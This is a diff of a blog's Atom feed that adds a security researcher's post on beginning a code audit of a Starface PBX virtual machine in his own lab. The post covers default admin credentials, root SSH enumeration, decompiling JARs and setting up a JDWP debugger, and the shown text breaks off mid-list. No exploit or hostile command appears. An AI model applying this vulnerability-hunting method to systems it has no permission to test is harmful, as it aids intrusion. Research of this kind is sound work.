@@ -1,1 +1,901 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-05-03T22:19:54+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Frycos Security Diary</title><subtitle>Blogging mainly</subtitle><entry><title type="html">Bye Bye medium.com</title><link href="http://localhost:4000/new/2022/05/01/welcome-to-my-new-blog.html" rel="alternate" type="text/html" title="Bye Bye medium.com" /><published>2022-05-01T23:00:09+02:00</published><updated>2022-05-01T23:00:09+02:00</updated><id>http://localhost:4000/new/2022/05/01/welcome-to-my-new-blog</id><content type="html" xml:base="http://localhost:4000/new/2022/05/01/welcome-to-my-new-blog.html">&lt;p&gt;No more medium.com in the future. I’ll publish my new blog posts here instead of &lt;a href=&quot;https://medium.com/@frycos&quot;&gt;https://medium.com/@frycos&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="new" /><summary type="html">No more medium.com in the future. I’ll publish my new blog posts here instead of https://medium.com/@frycos.</summary></entry></feed>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-05-24T23:53:28+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Frycos Security Diary</title><subtitle>Blogging mainly</subtitle><entry><title type="html">Security Code Audit - For Fun and Fails</title><link href="http://localhost:4000/vulns4free/2022/05/24/security-code-audit-fails.html" rel="alternate" type="text/html" title="Security Code Audit - For Fun and Fails" /><published>2022-05-24T23:00:09+02:00</published><updated>2022-05-24T23:00:09+02:00</updated><id>http://localhost:4000/vulns4free/2022/05/24/security-code-audit-fails</id><content type="html" xml:base="http://localhost:4000/vulns4free/2022/05/24/security-code-audit-fails.html">&lt;p&gt;Recently, I asked the Twitter community if anyone would be interested in a blog post about “failed” security code audit attempts.
+A lot of you seemed to like this idea, so here it is. I was somehow afraid to make a fool out of myself with this blog post
+but sometimes it seems that everybody thinks that security code audits are kind of “rocket science”.
+Usually it goes like this: the professionals choose some high-value target and achieving Pre-Auth Remote Code Executions (RCE) should be the golden standard. And also
+a professional doesn’t fail and it wouldn’t take weeks or months to find some critical vulnerabilities: IMHO, all of this belongs in dreamland.&lt;/p&gt;
+
+&lt;p&gt;So I try to give you a feeling how hard and frustrating it can be to audit a previously unknown product (without forgetting about the fun part!). Since my latest Pre-Auth RCE achievement
+was a PBX product named &lt;em&gt;3CX&lt;/em&gt; (see my &lt;a href=&quot;https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88&quot;&gt;blog post&lt;/a&gt;),
+I randomly chose another PBX product: &lt;strong&gt;Starface Comfortphoning&lt;/strong&gt;. One can find tons of instances exposing the web interface to the public internet. Simply
+have a look at &lt;a href=&quot;https://censys.io/&quot;&gt;Censys.io&lt;/a&gt; for example.&lt;/p&gt;
+
+&lt;p&gt;This blog post not only should give you some insight into my methods but also (my personal) common failures. Also keep in mind that &lt;strong&gt;I didn’t fully
+audit the product yet, not at all&lt;/strong&gt;. I might have looked at 10% max. The code base is just huge and there are several services besides the web interface running on such an instance.
+Thus, maybe after reading this blog post the one or the other will take some of my notes and find a nice vulnerability: I’m definitely still missing a lot of stuff
+which is of course fine. Also this is &lt;strong&gt;private time&lt;/strong&gt; and not related to any of my assessments at work or something similar. But let’s begin.&lt;/p&gt;
+
+&lt;h1 id=&quot;setup&quot;&gt;Setup&lt;/h1&gt;
+
+&lt;p&gt;First, I looked at the &lt;a href=&quot;https://www.starface.com/&quot;&gt;vendor’s homepage&lt;/a&gt; and read a lot of stuff like knowledge bases, support tickets, wikis etc.
+If I’m lucky, a trial version can be downloaded without talking to some sales guy waiting for recalls. In the &lt;a href=&quot;https://knowledge.starface.de/pages/viewpage.action?pageId=46564694&quot;&gt;Starface Wiki&lt;/a&gt; I got the opportunity to download a full version of the latest release.
+I chose &lt;strong&gt;STARFACE VM-Edition / Version 7.2.0.5&lt;/strong&gt; because virtual machine images usually come with a complete preinstallation and I can also
+control most of the environment, especially networking/firewalling.&lt;/p&gt;
+
+&lt;p&gt;They even provided a nice &lt;a href=&quot;https://knowledge.starface.de/display/SWD/Erstkonfiguration+der+STARFACE&quot;&gt;documentation&lt;/a&gt; for the initial setup, i.e.
+how to configure your instance properly. After a short installation routine, we were greeted with login web interface.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/loginmask.png&quot; alt=&quot;Login mask&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;An initial administrator account was created through the installation routine as well: &lt;em&gt;Mr. Admin Istrator&lt;/em&gt; with credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0001:adminadmin&lt;/code&gt;.
+Also an SSH service was provided, so I could easily get a proper shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; and changed the default password to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adminadmin&lt;/code&gt; as well.&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeration-within-ssh-session&quot;&gt;Enumeration within SSH session&lt;/h1&gt;
+
+&lt;p&gt;This was a pretty comfortable situation, having access as root user via SSH. All I needed for the first round of enumeration.
+I always start with the basics, i.e. enumeration of &lt;em&gt;processes&lt;/em&gt; and &lt;em&gt;network connections&lt;/em&gt;. Starting with process enumeration, I try to look
+at &lt;em&gt;unusual stuff&lt;/em&gt;, pretty much everything standing out from common (in this case) Linux processes.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# ps axuf
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+root        1176  0.0  0.3  92320  6160 ?        Ss   22:14   0:00 /usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oCiphers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128-cbc &lt;span class=&quot;nt&quot;&gt;-oMACs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hmac-sha2-256-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha1,umac-128@openssh.com,hmac-sha2-512 &lt;span class=&quot;nt&quot;&gt;-oGSSAPIKexAlgorithms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gss-curve25519-sha256-,gss-nistp256-sha256-,gss-group14-sha256-,gss-group16-sha512-,gss-gex-sha1-,gss-group14-sha1- &lt;span class=&quot;nt&quot;&gt;-oKexAlgorithms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1 &lt;span class=&quot;nt&quot;&gt;-oHostKeyAlgorithms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com &lt;span class=&quot;nt&quot;&gt;-oPubkeyAcceptedKeyTypes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ecdsa-sha2-nistp256,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519,ssh-ed25519-cert-v01@openssh.com,rsa-sha2-256,rsa-sha2-256-cert-v01@openssh.com,rsa-sha2-512,rsa-sha2-512-cert-v01@openssh.com,ssh-rsa,ssh-rsa-cert-v01@openssh.com &lt;span class=&quot;nt&quot;&gt;-oCASignatureAlgorithms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-256,rsa-sha2-512,ssh-rsa
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+tomcat      1696  2.5 40.0 4757928 810260 ?      Sl   22:14   0:57 /usr/bin/java &lt;span class=&quot;nt&quot;&gt;-Djava&lt;/span&gt;.util.logging.config.file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/tomcat/conf/logging.properties &lt;span class=&quot;nt&quot;&gt;-Djava&lt;/span&gt;.util.logging.manager&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;org.apache.juli.ClassLoaderLogManager &lt;span class=&quot;nt&quot;&gt;-Dderby&lt;/span&gt;.stream.error.file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nt&quot;&gt;-Xmx988M&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-XX&lt;/span&gt;:MaxDirectMemorySize&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;64M &lt;span class=&quot;nt&quot;&gt;-XX&lt;/span&gt;:+HeapDumpOnOutOfMemoryError &lt;span class=&quot;nt&quot;&gt;-XX&lt;/span&gt;:HeapDumpPath&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/starface/tomcat-jmv-dump.hprof &lt;span class=&quot;nt&quot;&gt;-Dderby&lt;/span&gt;.storage.pageCacheSize&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;200 &lt;span class=&quot;nt&quot;&gt;-XX&lt;/span&gt;:+UseParallelGC &lt;span class=&quot;nt&quot;&gt;-Dorg&lt;/span&gt;.apache.catalina.connector.CoyoteAdapter.ALLOW_BACKSLASH&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Dorg&lt;/span&gt;.apache.tomcat.util.buf.UDecoder.ALLOW_ENCODED_SLASH&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Dorg&lt;/span&gt;.apache.tomcat.util.http.Parameters.MAX_COUNT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10000 &lt;span class=&quot;nt&quot;&gt;-Djdk&lt;/span&gt;.tls.ephemeralDHKeySize&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4096 &lt;span class=&quot;nt&quot;&gt;-Djava&lt;/span&gt;.protocol.handler.pkgs&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;org.apache.catalina.webresources &lt;span class=&quot;nt&quot;&gt;-Dorg&lt;/span&gt;.apache.catalina.security.SecurityListener.UMASK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0002 &lt;span class=&quot;nt&quot;&gt;-agentlib&lt;/span&gt;:jdwp&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;transport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dt_socket,address&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8000,server&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;y,suspend&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;n &lt;span class=&quot;nt&quot;&gt;-Dignore&lt;/span&gt;.endorsed.dirs&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-classpath&lt;/span&gt; /opt/tomcat/bin/bootstrap.jar:/opt/tomcat/bin/tomcat-juli.jar &lt;span class=&quot;nt&quot;&gt;-Dcatalina&lt;/span&gt;.base&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/tomcat &lt;span class=&quot;nt&quot;&gt;-Dcatalina&lt;/span&gt;.home&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/tomcat &lt;span class=&quot;nt&quot;&gt;-Djava&lt;/span&gt;.io.tmpdir&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/tomcat/temp org.apache.catalina.startup.Bootstrap start
+root        1697  0.0  0.1  26244  3176 tty1     Ss+  22:14   0:00 /bin/bash /usr/sbin/adminshell.sh
+root        1722  0.4  9.5 3791908 193660 ?      Sl   22:14   0:10 java &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; /var/lib/watchdog/watchdog.jar
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+daemon      2861  0.6 16.0 4026156 324672 ?      Sl   22:15   0:14 /usr/lib/jvm/java/bin/java &lt;span class=&quot;nt&quot;&gt;-Djdk&lt;/span&gt;.tls.ephemeralDHKeySize&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4096 &lt;span class=&quot;nt&quot;&gt;-DopenfireHome&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/openfire &lt;span class=&quot;nt&quot;&gt;-Dopenfire&lt;/span&gt;.lib.dir&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/opt/openfire/lib &lt;span class=&quot;nt&quot;&gt;-classpath&lt;/span&gt; /opt/openfire/lib/startup.jar &lt;span class=&quot;nt&quot;&gt;-jar&lt;/span&gt; /opt/openfire/lib/startup.jar
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So one could observe strange SSH daemon command line parameters, an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adminshell.sh&lt;/code&gt; and of course all these &lt;strong&gt;Java processes&lt;/strong&gt;.
+Being mainly interested in the code audit parts, let’s change the directory to the presumably correct web app deployment: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/tomcat/webapps/localhost/starface/&lt;/code&gt;. If you’re not familiar with something of the technology stack you’re looking at during enumeration (or code audit) phase(s), always try to Google the hell out of it. Reading documentation not only gives you expert knowledge on a technology but also could lead to some hints for (new) exploitation primitives later on.&lt;/p&gt;
+
+&lt;p&gt;Since we’re dealing with a Java application, one could start to search for JSP&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost starface] find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iname&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'*.jsp'&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# not really successful in this case&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;or XML files&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost starface] find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iname&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'*.xml'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+./WEB-INF/classes/struts.xml
+./WEB-INF/classes/struts2-admin-interconnect.xml
+./WEB-INF/classes/struts2-admin-moh.xml
+./WEB-INF/classes/struts2-admin-phone.xml
+./WEB-INF/classes/struts2-admin-security.xml
+./WEB-INF/classes/struts2-module-designer.xml
+./WEB-INF/classes/struts2-module-manager.xml
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+./WEB-INF/xml/authfilter_config.xml
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+./WEB-INF/struts-config.xml
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+./WEB-INF/web.xml &lt;span class=&quot;c&quot;&gt;# this is what you want later&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Again, I like to mark all file locations which somehow stand out from the “noisy” stuff such as resource bundle files containing UI messages for different languages for example. I guess most of you are already familiar with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WEB-INF/web.xml&lt;/code&gt; file, the web descriptor file with all kind of interesting declarations like &lt;em&gt;URL paths, Java Servlets, Java Filters, security constraints&lt;/em&gt; and much more. We will look at this later.&lt;/p&gt;
+
+&lt;p&gt;Also do not forget to look at the running network services: which services are listening on which ports? Are those services accessible from “outside”, i.e.
+not listening only on loopback interfaces? Is there a firewall in place?&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost starface]# netstat &lt;span class=&quot;nt&quot;&gt;-antp&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;LISTEN
+tcp        0      0 0.0.0.0:8000            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      1696/java           
+tcp        0      0 0.0.0.0:5060            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      1621/asterisk       
+tcp        0      0 0.0.0.0:5061            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      1621/asterisk       
+tcp        0      0 127.0.0.1:5038          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      1621/asterisk       
+tcp        0      0 0.0.0.0:4559            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      1258/hfaxd          
+tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      1176/sshd           
+tcp        0      0 127.0.0.1:5432          0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      1205/postmaster     
+tcp        0      0 127.0.0.1:25            0.0.0.0:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;               LISTEN      2063/master         
+tcp6       0      0 :::50080                :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1696/java           
+tcp6       0      0 :::50081                :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1696/java           
+tcp6       0      0 127.0.0.1:9090          :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      2861/java           
+tcp6       0      0 127.0.0.1:9091          :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      2861/java           
+tcp6       0      0 :::5222                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      2861/java           
+tcp6       0      0 :::5223                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      2861/java           
+tcp6       0      0 :::5229                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      2861/java           
+tcp6       0      0 :::8080                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1696/java           
+tcp6       0      0 127.0.0.1:8977          :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1696/java           
+tcp6       0      0 :::5269                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      2861/java           
+tcp6       0      0 :::8181                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1696/java           
+tcp6       0      0 :::22                   :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1176/sshd           
+tcp6       0      0 :::3000                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1696/java           
+tcp6       0      0 ::1:5432                :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1205/postmaster     
+tcp6       0      0 ::1:25                  :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      2063/master         
+tcp6       0      0 :::3002                 :::&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN      1696/java
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It’s easy to write all this stuff in a few minutes for this blog post but believe me: I usually spend a large amount of time
+for these enumeration steps. And &lt;strong&gt;everything is written down in great detail&lt;/strong&gt; into my notes, preferably markdown.&lt;/p&gt;
+
+&lt;p&gt;Also, I like to search through log files such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/tomcat/logs/catalina.out&lt;/code&gt;. This revealed a nice banner providing more valuable information such as the Java version.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;####### STARFACE version 7.1.1.7 started in 50558ms. #######
+  Current Java version is: 1.8.0_292
+  JVM: OpenJDK 64-Bit Server VM (25.292-b10, mixed mode)
+  Running on: 4x amd64 Processor(s)
+  RAM available for JVM: 878 MB
+  Free hard disk space: 23 GB
+  HardwareId: 206f990abfa7126be1b54bcd082f7879be3677fa
+####### ############################################ #######
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Why is this important? Sometimes several Java versions are installed on the same system but you want to make sure which one is used for the process you’re looking at right now.&lt;/p&gt;
+
+&lt;h1 id=&quot;setup-code-audit-toolset&quot;&gt;Setup Code Audit Toolset&lt;/h1&gt;
+
+&lt;p&gt;Before we talk about some tools I use during (Java) security code audits, what do we need? Well yes, the code.
+With some proper &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find&lt;/code&gt; commands, one can easily search for all relevant files: usually &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.class&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.jar&lt;/code&gt;. You might include of course &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.jsp&lt;/code&gt; etc.
+if applicable. But since you did proper file system enumeration before, it is already known to you where the code is located.&lt;/p&gt;
+
+&lt;p&gt;My approach usually goes like this: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find . -iname '*.jar' -exec cp {} ALL_JARS \;&lt;/code&gt;, i.e. all class and JAR files are copied to new directories I create in advance.
+Then there is a beautiful little &lt;a href=&quot;https://github.com/mogwailabs/jarjarbigs&quot;&gt;Python script&lt;/a&gt; by &lt;em&gt;Mogwai Labs&lt;/em&gt;. This script recursively goes through the input directory and in the end creates one “huge” JAR file for you. It can process JAR and class files as well.&lt;/p&gt;
+
+&lt;p&gt;Now we got one or more JAR files and as you might know, Java bytecode is reversible which is great from an auditors perspective.
+There are quite some Java decompilers out there, here are my current recommendations:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://java-decompiler.github.io/&quot;&gt;JD-GUI&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.benf.org/other/cfr/&quot;&gt;CFR&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/mstrobel/procyon&quot;&gt;Procyon&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;There are even tools which provide different decompilers in one application such as &lt;a href=&quot;https://github.com/Konloch/bytecode-viewer&quot;&gt;Bytecode Viewer&lt;/a&gt; which is great for a “quick overview” but I usually stick to the toolset above. And one definitely should use &lt;strong&gt;different Java decompilers&lt;/strong&gt; because each one of them comes with strengths and weaknesses. The most obvious weakness you might spot: one or more Java classes couldn’t be decompiled by one decompiler but the others could.
+One decompiler has problems with reversing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;switch&lt;/code&gt; statements, the other might not be capable of extracting nested anonymous classes etc. pp.&lt;/p&gt;
+
+&lt;p&gt;Alright, now all is setup for decompiling the huge JAR(s) we built with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jarjarbigs&lt;/code&gt;. I won’t list all command line parameters for each decompiler so simply read the CLI manual or documentation. Now you’re ready to open the source files with the editor of your choice &lt;strong&gt;but&lt;/strong&gt; we want to &lt;strong&gt;debug all the things&lt;/strong&gt; as well.&lt;/p&gt;
+
+&lt;p&gt;So we fetch the &lt;strong&gt;Eclipse IDE&lt;/strong&gt; from &lt;a href=&quot;https://www.eclipse.org/downloads/packages/&quot;&gt;here&lt;/a&gt;. I usually prefer the &lt;strong&gt;Eclipse IDE for Enterprise Java and Web Developers&lt;/strong&gt; edition but &lt;strong&gt;Eclipse IDE for Java Developers&lt;/strong&gt; might be sufficient for most cases.
+The &lt;strong&gt;JD-GUI&lt;/strong&gt; project also provides an &lt;a href=&quot;https://github.com/java-decompiler/jd-eclipse/releases/download/v2.0.0/jd-eclipse-2.0.0.zip&quot;&gt;Eclipse plugin&lt;/a&gt;
+which can be easily installed using the Eclipse menu path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Help -&amp;gt; Install new Software&lt;/code&gt;. Also do not forget to set the &lt;strong&gt;file associations&lt;/strong&gt; for &lt;em&gt;class without source&lt;/em&gt; etc. to the new plugin. Otherwise, Java classes won’t be decompiled in the editor mode automatically.&lt;/p&gt;
+
+&lt;p&gt;You can check your configuration by opening a random Java type (e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;de.vertico.starface.db.container.UpdateContainer&lt;/code&gt;) and what you should see is this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/auditfails/samplejavaclass.png&quot; alt=&quot;Sample Java Class&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;During our SSH session enumeration we of course checked if there was some kind of debugging service running already which was not. So how to setup a debug interface? What we need is a &lt;strong&gt;JDWP&lt;/strong&gt; (Java Debug Wire Protocol) interface our Eclipse instance could talk to. Reading some Tomcat documentation one quickly finds a way to do this. We created a new file at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/tomcat/bin&lt;/code&gt; with the following content:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CATALINA_OPTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CATALINA_OPTS&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; -agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After restarting the virtual machine we tried to connect to the IP address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.2.103&lt;/code&gt; on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8000&lt;/code&gt; and….got nothing. This should have worked because there was no NATing in place or so. The virtual network interface was in &lt;em&gt;bridge mode&lt;/em&gt; so we should have been able to talk to it. Several solutions existed but I usually chose the laziest: &lt;strong&gt;SSH port forwarding&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8000:127.0.0.1:8000 root@192.168.2.103 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now everything should have been setup to live debug the Java code. A few steps were missing though:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Create a new empty Java project.&lt;/li&gt;
